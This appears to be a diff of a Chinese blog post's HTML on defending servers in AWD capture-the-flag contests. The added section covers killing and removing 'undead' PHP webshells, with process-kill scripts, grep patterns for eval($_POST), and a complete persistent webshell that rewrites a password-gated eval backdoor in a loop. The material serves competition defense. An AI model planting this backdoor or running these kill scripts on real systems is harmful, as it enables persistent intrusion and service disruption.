@@ -25,7 +25,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/favicon.ico">
 <meta property="article:published_time" content="2024-04-28T12:34:41.000Z">
-<meta property="article:modified_time" content="2024-05-25T12:45:47.550Z">
+<meta property="article:modified_time" content="2024-06-06T08:06:12.370Z">
 <meta property="article:author" content="Err0r2333">
 <meta property="article:tag" content="awd">
 <meta name="twitter:card" content="summary">
@@ -178,7 +178,7 @@
                     <i class="fa fa-edit"></i> 
                     
                     
-                        ~38.24K
+                        ~40.04K
                     
                     字
                 </li>
@@ -195,7 +195,7 @@
             
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
                 <div class="icon"><i class="fa fa-warning"></i></div>
-                <div class="text"><p>本文最后编辑于 <time datetime="1716641147550"></time> 前，其中的内容可能需要更新。</p></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1717661172370"></time> 前，其中的内容可能需要更新。</p></div>
             </div>
             
             
@@ -326,12 +326,34 @@
 <p>搜webshell：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find /var/www/html -name *.php -mmin -5                        //查看最近5分钟修改文件</span><br><span class="line">find ./ -name &#x27;*.php&#x27; | xargs wc -l | sort -u                  //寻找行数最短文件，一般有可能是一句话木马</span><br><span class="line">grep -r --include=*.php  &#x27;[^a-z]eval($_POST&#x27;  /var/www/html    //查包含关键字的php文件</span><br><span class="line">find /var/www/html -type f -name &quot;*.php&quot; | xargs grep &quot;eval(&quot; |more //在Linux系统中使用find、grep和xargs命令的组合，用于在指定目录（/var/www/html）下查找所有以.php为扩展名的文件，并搜索这些文件中包含字符串&quot;eval(&quot;的行，并使用more命令来分页显示结果以便在输出较长时进行逐页查看</span><br></pre></td></tr></table></figure>
 <p>不死马：</p>
+<p>高权限下，可以直接重启服务：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ubuntu</span></span><br><span class="line">service apache2 start</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">centos</span></span><br><span class="line">systemctl apache2 start</span><br></pre></td></tr></table></figure>
+<p>但是基本上比赛的时候不会放出高权限的账户，得在低权限下进行处理：</p>
+<p>del.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">//www-data，用户名不一定是www-data，要看情况</span></span><br><span class="line">	<span class="title function_ invoke__">system</span>(<span class="string">&quot;kill `ps -aux | grep www-data | grep -v grep | awk &#x27;&#123;print <span class="subst">$2</span>&#125;&#x27; | xargs kill -9`&quot;</span>);</span><br><span class="line">	<span class="comment">//杀php-fpm</span></span><br><span class="line">	<span class="title function_ invoke__">system</span>(<span class="string">&quot;kill `ps -ef | grep php-fpm | grep -v grep | awk &#x27;&#123;print <span class="subst">$2</span>&#125;&#x27;`&quot;</span>);</span><br><span class="line">	<span class="comment">//杀httpd php-apache</span></span><br><span class="line">	<span class="title function_ invoke__">system</span>(<span class="string">&quot;kill `ps -ef | grep httpd | grep -v grep | awk &#x27;&#123;print <span class="subst">$2</span>&#125;&#x27;`&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>访问后再删除不死马</p>
+<p>也可以先利用ps命令查看进程的pid</p>
+<p>或者我们也可以用<code>ps -aux</code>命令来查看每个用户执行的命令和运行的进程</p>
+<p>然后：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"> <span class="variable">$pid</span>=<span class="number">1234</span>; <span class="comment">//进程的pid</span></span><br><span class="line"> @<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;.shell.php&#x27;</span>);</span><br><span class="line"> <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;kill -9 $pid&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>方法2：创建一个和不死马同名的文件夹</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">cd</span> /var/www/html/</span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>;<span class="keyword">do</span> <span class="built_in">rm</span> -rf .l.php;<span class="built_in">mkdir</span> .l.php;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+<p>运行时：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup bash 1.sh &amp;</span><br></pre></td></tr></table></figure>
+<p>方法3：竞争写入无意义的一句话：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line">    <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="string">&#x27;.l.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$code</span> = <span class="string">&#x27;&lt;?php echo &quot;awa&quot;; ?&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$code</span>);</span><br><span class="line">        <span class="comment">//system(&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .l.php&#x27;);</span></span><br><span class="line">        <span class="comment">//usleep(1000);</span></span><br><span class="line">        <span class="title function_ invoke__">usleep</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -aux | grep www-data | grep -v grep | awk &#x27;&#123;print $2&#125;&#x27; | xargs kill -9</span><br></pre></td></tr></table></figure>
 <p>查杀弹shell</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps -ef</span><br><span class="line">px -aux</span><br><span class="line">ps -aux | grep www-data</span><br></pre></td></tr></table></figure>
 <p>检查是否有<code>/bin/sh</code>或者<code>/bin/bash</code></p>
 <p>很有可能是nc</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill ps -aux | grep www-data | grep apache2 | awk &#x27;&#123;print $2&#125;&#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill `ps -aux | grep www-data | grep apache2 | awk &#x27;&#123;print $2&#125;&#x27;`</span><br></pre></td></tr></table></figure>
+<p>变种不死马：</p>
+<p>文件名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-index.php等</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line">    <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="string">&#x27;-index.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$code</span> = <span class="string">&#x27;&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;56183c1f36ef08fb8b027a4116db8483&quot;)&#123;@eval($_POST[&quot;a&quot;]);&#125; ?&gt;&#x27;</span>;</span><br><span class="line">    <span class="comment">//pass=lewiserii</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$code</span>);</span><br><span class="line">        <span class="comment">//system(&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; -index.php&#x27;);</span></span><br><span class="line">        <span class="title function_ invoke__">usleep</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>删除只需要添加</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./</span><br><span class="line">例如</span><br><span class="line">rm -rf ./-index.php</span><br></pre></td></tr></table></figure>
 <h2><span id="web服务加固"> web服务加固</span></h2>
 <h3><span id="php"> php</span></h3>
 <h4><span id="sql注入"> sql注入</span></h4>
@@ -699,7 +721,7 @@
                     <a class="tag-none-link" href="/tags/awd/" rel="tag">awd</a>
                 </div>
                 <div class="pull-date">
-                    <time datetime="2024-05-25T12:45:47.550Z" itemprop="dateModified">最后编辑：2024-05-25</time>
+                    <time datetime="2024-06-06T08:06:12.370Z" itemprop="dateModified">最后编辑：2024-06-06</time>
                 </div>
             </div>
         </footer>
@@ -816,7 +838,7 @@
                 文章
             </span>
             <span class="count">
-                64
+                65
             </span>
         </a>
         <a class="meta-item" href="/categories/">
@@ -852,7 +874,7 @@
   <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
     <h4 class="widget-title"><i class="fa fa-tags"></i>标签聚合</h4>
       <div class="tag-clouds">
-        <a href="/tags/Introduce-Myself/" style="font-size: 0.6em;">Introduce_Myself</a> <a href="/tags/Java/" style="font-size: 0.6em;">Java</a> <a href="/tags/Misc/" style="font-size: 0.6em;">Misc</a> <a href="/tags/POST/" style="font-size: 0.67em;">POST</a> <a href="/tags/RCE/" style="font-size: 0.67em;">RCE</a> <a href="/tags/SQL-Injection/" style="font-size: 0.7em;">SQL_Injection</a> <a href="/tags/Upload/" style="font-size: 0.6em;">Upload</a> <a href="/tags/Web/" style="font-size: 0.8em;">Web</a> <a href="/tags/awd/" style="font-size: 0.6em;">awd</a> <a href="/tags/java/" style="font-size: 0.73em;">java</a> <a href="/tags/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A/" style="font-size: 0.6em;">不务正业</a> <a href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/" style="font-size: 0.77em;">基础漏洞</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 0.63em;">渗透</a>
+        <a href="/tags/Introduce-Myself/" style="font-size: 0.6em;">Introduce_Myself</a> <a href="/tags/Java/" style="font-size: 0.6em;">Java</a> <a href="/tags/Misc/" style="font-size: 0.6em;">Misc</a> <a href="/tags/POST/" style="font-size: 0.69em;">POST</a> <a href="/tags/RCE/" style="font-size: 0.69em;">RCE</a> <a href="/tags/SQL-Injection/" style="font-size: 0.71em;">SQL_Injection</a> <a href="/tags/Upload/" style="font-size: 0.6em;">Upload</a> <a href="/tags/Web/" style="font-size: 0.8em;">Web</a> <a href="/tags/awd/" style="font-size: 0.63em;">awd</a> <a href="/tags/java/" style="font-size: 0.74em;">java</a> <a href="/tags/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A/" style="font-size: 0.6em;">不务正业</a> <a href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/" style="font-size: 0.77em;">基础漏洞</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 0.66em;">渗透</a>
       </div>
   </aside>
 
@@ -863,6 +885,12 @@
   <div class="tab-content">
       <ul class="list-group">
         
+        
+          
+          
+            <a class="list-group-item" href="/posts/12279.html"><i class="fa  fa-book"></i> 被awd速通(2)</a>
+            
+          
         
           
           
@@ -889,11 +917,7 @@
           
         
           
-          
-            <a class="list-group-item" href="/posts/28066.html"><i class="fa  fa-book"></i> Tomcat内存马(一)</a>
             
-          
-        
           
             
           
